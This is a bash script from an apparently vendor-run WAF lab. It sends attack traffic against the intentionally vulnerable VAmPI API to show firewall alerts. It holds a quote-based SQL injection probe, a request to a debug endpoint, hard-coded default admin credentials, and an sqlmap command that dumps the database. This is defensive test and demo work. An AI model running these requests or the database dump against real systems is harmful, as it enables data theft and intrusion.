# 2024 - Check Point Software - WAF LAB
# cp_api_bad.sh 
# The following script was created to traffic that will provide alerts on the Check Point GG WAF API, 
# against the VAMPI application. 
#
# This is a work in progress
# Write by Vince Mammoliti - vincem@checkpoint.com
# Version 0.2
#
#/usr/bin/bash

set -euo pipefail

declare vResponse='silentResponse'
function silentResponse () {
       	:
}

VFLAG=0
REPEAT=1
LINE=10
CHAR=$(( 80 * $LINE)) 
RED='\033[0;31m'
NC='\033[0m' # No Color
HOST="http://juiceshop.local:8500"
DOCKER_HOST="`hostname -I| awk ' {print $1}'`"

usage(){
>&2 cat << EOF
$0 is an API demonstration tool to create 'Bad Traffic " to demonstration capability of the Check Point Cloud Guard WAF
Written by Vince Mammoliti - vincem@checkpoint.com - 2024

Usage: $0 [OPTIONS...] [URL of VAMPI host - defaults to $HOST] 
  -v | --verbose             provides details of commands excuited against host  
  -l | --lines               limit the number of lines with verbose (default 10)
  -r | --repeat              repeat the number of times to send requests. (default 1) 
  -s | --sql		     uses sqlmap to attempt to dump database
  -h | --help                this help screen is displayed
EOF
exit 1
}

gettoken(){
TOKEN=$(curl -sS -X POST   ${HOST}/users/v1/login   -H 'accept: application/json' \
	                  -H 'Content-Type: application/json'  \
                          -d '{ "password": "pass1", "username": "admin" }' \
			   | jq -r '.auth_token')		       
return 0
} 

sqldump(){
if ! [ -x "$(command -v sqlmap)" ]; then 
	echo "sqlmap is not installed - please install 'apt-get install sqlmap'" >&2
	exit 1
fi
gettoken
sqlmap -u ${HOST}"/users/v1/*name1*" --method=GET --headers="Accept: application/json\nAuthorization: Bearer $TOKEN \nHost: ${TOKEN} " --dbms=sqlite --dump
exit 0
}

ifblocked(){
	if echo "$OUTPUT" |  grep -q -o -P '.{0,20}Application Security.{0,4}'; then 
		echo -e "${RED}Check Point - Application Security Blocked ${NC}"
       	fi
}

args=$(getopt -a -o l:vr:s --long lines:,help,verbose,repeat:,sql -- "$@")

if [[ $? -gt 0 ]]; then
  usage
fi

eval set -- ${args}
while :
do
  case $1 in
	-v | --verbose)   VFLAG=1 ; vResponse='echo' ; shift   ;;
	-l | --lines)     LINE=$2 ; CHAR=$(( 80 * $LINE)); shift 2 ;; 
	-h | --help)      usage   ; shift   ;;
	-r | --repeat)    REPEAT=$2  ; shift 2 ;;
	-s | --sql )      sqldump ; exit 1 ;;
	--) shift; break ;;
	 *)   usage; exit 1 ;;
   esac
done

if [ ! -z "$@" ]; then     # Check to see if there is a URL on the command, if so replace
	 HOST=$@
fi

echo "HOST: ${HOST}"

echo -e "\n WAF API - Training Traffic - Simulator - $0 -h for options \n"
for (( i=0; i < $REPEAT ; ++i));
do
   loop=$(($i+1))
   echo "Loop: $loop"
   gettoken
   # Create a Bad Book Lookup
   echo "1) Send a bad book lookup - sending /books/v1/cp-GCWAF-102x "
   OUTPUT=$(curl -sS -X GET  ${HOST}/books/v1/cp-GCWAF-102x   -H 'accept: application/json'  -H "Authorization: Bearer $TOKEN" )
   ifblocked
   $vResponse ${OUTPUT:0:$CHAR}

   #Create and account attact "user1'" 
   echo "2) Send an attempt to exploit account - send /users/v1/user1' "
   OUTPUT=$(curl -sS -X GET "${HOST}/users/v1/user1'"  -H 'Content-Type: application/json' \
                 -H "Authorization: Bearer $TOKEN"
                )
   ifblocked
   $vResponse ${OUTPUT:0:$CHAR}


   #Create and account attact /users/v1/_debug'"
   echo "3) Send an attempt to exploit of developer testing tool send /users/v1/_debug "
   OUTPUT=$(curl -sS -X GET "${HOST}/users/v1/_debug"  -H 'Content-Type: application/json' \
	                       -H "Authorization: Bearer $TOKEN"
                      )
   ifblocked
   $vResponse ${OUTPUT:0:$CHAR}


done
exit 0



